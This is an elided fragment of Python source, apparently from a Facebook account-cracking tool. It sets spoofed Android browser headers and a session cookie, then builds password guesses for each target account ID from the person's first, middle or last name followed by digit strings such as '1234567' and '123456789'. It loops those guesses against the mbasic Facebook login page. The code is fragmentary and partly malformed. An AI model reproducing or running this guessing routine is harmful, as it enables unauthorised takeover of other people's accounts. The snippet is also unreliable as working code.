...
def login():
	...
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 10; CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","referer": "https://mbasic.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		...
		for akun in id:
			...
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					...
					pwx.append(depan+"1234567")
					pwx.append(depan+"12345678")
				...
				if len(depan)<=1 or len(depan)<=2:
					try:
						...
						if len(tengah)<=3:
							...
							pwx.append(tengah+"1234567")
							pwx.append(tengah+"12345678")
							pwx.append(tengah+"123456789")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
					...
					try:
						...
						try:
							...
							if len(belakang)<=3:pass
								...
								pwx.append(belakang+"1234567")
								pwx.append(belakang+"12345678")
								pwx.append(belakang+"123456789")
								pwx.append(nama)
	...
	for pw in pwx:
		try:
			hd1 = {
				...
				"user-agent":"Mozilla/5.0 (Linux; Android 10; CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
			...
			link = ses.get(f'https://{url}/login/?next&ref=dbl&fl&refid=8', headers=hd1)
